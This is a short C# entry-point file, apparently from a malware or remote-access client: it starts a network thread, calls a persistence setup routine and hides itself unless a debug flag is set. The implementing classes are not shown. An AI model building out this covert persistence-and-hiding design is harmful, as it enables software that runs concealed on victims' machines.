using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
namespace d3pl0y
{
    class Program
    {
        static void Main(string[] args)
        {
          Thread bThread = new Thread(new ThreadStart(Network.Begin));
          bThread.Start();
          Persist.envSetup();
          if (Config.debug != true)
          {
              Persist.hide();
          }
       
            
        }
    }
}
